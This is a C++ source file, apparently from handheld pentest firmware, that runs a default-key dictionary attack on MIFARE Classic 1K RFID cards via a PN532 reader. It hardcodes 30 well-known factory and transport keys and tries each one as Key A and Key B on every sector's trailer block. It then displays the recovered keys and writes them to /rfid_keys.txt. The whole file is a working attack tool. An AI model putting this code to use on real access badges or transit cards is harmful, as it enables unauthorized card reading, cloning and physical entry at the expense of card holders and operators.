/**
 * @file rfid_key_attack.cpp
 * @brief MIFARE Classic default-key dictionary attack via PN532 (I2C).
 *
 * Tries 30 well-known factory / transport keys against each sector of a
 * MIFARE Classic 1K (16 sectors).  Reports which sectors were unlocked
 * and with which key, then offers to save the results.
 */
#ifndef LITE_VERSION
#include "rfid_key_attack.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include <Adafruit_PN532.h>
#include <LittleFS.h>
#include <globals.h>

// ── Known default keys ──────────────────────────────────────────
static const uint8_t KNOWN_KEYS[][6] = {
    {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, // Factory default
    {0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5},
    {0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5},
    {0xC0, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5},
    {0xD0, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5},
    {0xE0, 0xE1, 0xE2, 0xE3, 0xE4, 0xE5},
    {0xF0, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5},
    {0x4D, 0x3A, 0x99, 0xC3, 0x51, 0xDD},
    {0x1A, 0x98, 0x2C, 0x7E, 0x45, 0x9A},
    {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF},
    {0x71, 0x4C, 0x5C, 0x88, 0x6E, 0x97},
    {0x58, 0x7E, 0xE5, 0xF9, 0x35, 0x0F},
    {0xA0, 0x47, 0x8C, 0xC3, 0x90, 0x91},
    {0x53, 0x3C, 0xB6, 0xC7, 0x23, 0xF6},
    {0x8F, 0xD0, 0xA4, 0xF2, 0x56, 0xE9},
    {0xA6, 0x45, 0x98, 0xA7, 0x74, 0x78},
    {0x26, 0x94, 0x0B, 0x21, 0xFF, 0x5D},
    {0xFC, 0x00, 0x01, 0x87, 0x78, 0xF7},
    {0x00, 0x00, 0x0F, 0xFE, 0x24, 0x88},
    {0x46, 0x5C, 0x6A, 0xBE, 0x22, 0xF3}, // NXP transport key
    {0xD3, 0xF7, 0xD3, 0xF7, 0xD3, 0xF7}, // NDEF default
    {0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA6},
    {0x76, 0x65, 0x54, 0x43, 0x32, 0x21},
    {0x2A, 0x2C, 0x13, 0xCC, 0x24, 0x2A},
    {0x48, 0x65, 0x6C, 0x6C, 0x6F, 0x21}, // "Hello!"
    {0x01, 0x02, 0x03, 0x04, 0x05, 0x06},
    {0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F},
    {0x10, 0x11, 0x12, 0x13, 0x14, 0x15},
    {0xAB, 0xCD, 0xEF, 0x12, 0x34, 0x56},
};
#define KEY_COUNT (sizeof(KNOWN_KEYS) / 6)

struct SectorResult {
    bool   foundA;
    bool   foundB;
    uint8_t keyA[6];
    uint8_t keyB[6];
};

static void drawAttackUI(int sector, int keyIdx, int totalSectors,
                         int found, bool done) {
    tft.fillScreen(bruceConfig.bgColor);
    drawMainBorderWithTitle("KEY ATTACK");

    int y  = BORDER_PAD_Y + FM * LH + 4;
    int lh = max(10, tftHeight / 8);
    char buf[32];
    tft.setTextSize(FP);

    if (done) {
        tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
        snprintf(buf, sizeof(buf), "Done! Found: %d keys", found * 2);
        tft.drawCentreString(buf, tftWidth / 2, y + lh, 1);
        tft.setTextColor(TFT_DARKGREY, bruceConfig.bgColor);
        tft.drawCentreString("[OK]Save [ESC]Back", tftWidth / 2, tftHeight - 9, 1);
        return;
    }

    // Progress
    tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
    snprintf(buf, sizeof(buf), "Sec:%d/%d  Key:%d/%d",
             sector, totalSectors - 1, keyIdx, (int)KEY_COUNT - 1);
    tft.drawCentreString(buf, tftWidth / 2, y, 1);
    y += lh;

    // Found so far
    tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
    snprintf(buf, sizeof(buf), "Found: %d sectors", found);
    tft.drawString(buf, 12, y, 1);
    y += lh;

    // Progress bar (sectors)
    int bW = tftWidth - 24;
    int bX = 12;
    tft.fillRect(bX, y, bW, 5, TFT_DARKGREY);
    if (totalSectors > 0) {
        int fill = (sector * bW) / totalSectors;
        tft.fillRect(bX, y, fill, 5, TFT_GREEN);
    }
    tft.drawRect(bX, y, bW, 5, bruceConfig.priColor);
    y += 8;

    // Current key
    tft.setTextColor(TFT_DARKGREY, bruceConfig.bgColor);
    snprintf(buf, sizeof(buf), "%02X%02X%02X%02X%02X%02X",
             KNOWN_KEYS[keyIdx][0], KNOWN_KEYS[keyIdx][1], KNOWN_KEYS[keyIdx][2],
             KNOWN_KEYS[keyIdx][3], KNOWN_KEYS[keyIdx][4], KNOWN_KEYS[keyIdx][5]);
    tft.drawCentreString(buf, tftWidth / 2, y, 1);

    tft.setTextColor(TFT_DARKGREY, bruceConfig.bgColor);
    tft.drawCentreString("[ESC] Abort", tftWidth / 2, tftHeight - 9, 1);
}

void rfid_key_attack() {
    // Init PN532 I2C
    Adafruit_PN532 nfc;
    nfc.begin();
    uint32_t versiondata = nfc.getFirmwareVersion();
    if (!versiondata) {
        displayError("PN532 not found", true);
        return;
    }
    nfc.SAMConfig();

    // Wait for card
    tft.fillScreen(bruceConfig.bgColor);
    drawMainBorderWithTitle("KEY ATTACK");
    tft.setTextSize(FP);
    tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
    int y = BORDER_PAD_Y + FM * LH + 8;
    tft.drawCentreString("Present MIFARE", tftWidth / 2, y, 1);
    tft.drawCentreString("Classic card...", tftWidth / 2, y + 10, 1);
    tft.setTextColor(TFT_DARKGREY, bruceConfig.bgColor);
    tft.drawCentreString("[ESC] Back", tftWidth / 2, tftHeight - 9, 1);

    uint8_t uid[7];
    uint8_t uidLen = 0;

    while (!uidLen) {
        if (check(EscPress)) return;
        nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLen, 200);
        delay(50);
    }

    // 16 sectors for MIFARE Classic 1K
    const int SECTORS = 16;
    SectorResult results[SECTORS];
    memset(results, 0, sizeof(results));
    int foundSectors = 0;
    bool aborted = false;

    for (int sec = 0; sec < SECTORS && !aborted; sec++) {
        uint8_t block = sec * 4 + 3; // trailer block

        for (int ki = 0; ki < (int)KEY_COUNT && !aborted; ki++) {
            if (check(EscPress)) { aborted = true; break; }

            drawAttackUI(sec, ki, SECTORS, foundSectors, false);

            // Try Key A
            if (!results[sec].foundA) {
                uint8_t key[6];
                memcpy(key, KNOWN_KEYS[ki], 6);
                if (nfc.mifareclassic_AuthenticateBlock(uid, uidLen, block, 0, key) == 1) {
                    results[sec].foundA = true;
                    memcpy(results[sec].keyA, key, 6);
                    foundSectors++;
                }
            }

            // Brief re-select needed between auths
            nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLen, 50);

            // Try Key B
            if (!results[sec].foundB) {
                uint8_t key[6];
                memcpy(key, KNOWN_KEYS[ki], 6);
                if (nfc.mifareclassic_AuthenticateBlock(uid, uidLen, block, 1, key) == 1) {
                    results[sec].foundB = true;
                    memcpy(results[sec].keyB, key, 6);
                }
            }

            if (results[sec].foundA && results[sec].foundB) break;
            delay(10);
        }
    }

    // Show results
    drawAttackUI(SECTORS, KEY_COUNT, SECTORS, foundSectors, true);

    // Wait for user to save or exit
    while (true) {
        if (check(EscPress)) return;
        if (check(SelPress)) {
            // Build result string
            String out = "MIFARE Key Attack Results\n";
            char buf[64];
            for (int s = 0; s < SECTORS; s++) {
                snprintf(buf, sizeof(buf), "Sector %02d:", s);
                out += buf;
                if (results[s].foundA) {
                    snprintf(buf, sizeof(buf), " A=%02X%02X%02X%02X%02X%02X",
                             results[s].keyA[0], results[s].keyA[1], results[s].keyA[2],
                             results[s].keyA[3], results[s].keyA[4], results[s].keyA[5]);
                    out += buf;
                }
                if (results[s].foundB) {
                    snprintf(buf, sizeof(buf), " B=%02X%02X%02X%02X%02X%02X",
                             results[s].keyB[0], results[s].keyB[1], results[s].keyB[2],
                             results[s].keyB[3], results[s].keyB[4], results[s].keyB[5]);
                    out += buf;
                }
                out += "\n";
            }

            File f = LittleFS.open("/rfid_keys.txt", FILE_WRITE);
            if (f) { f.print(out); f.close(); displaySuccess("Saved to /rfid_keys.txt", true); }
            else    { displayError("Save failed", true); }
            return;
        }
        delay(50);
    }
}
#endif
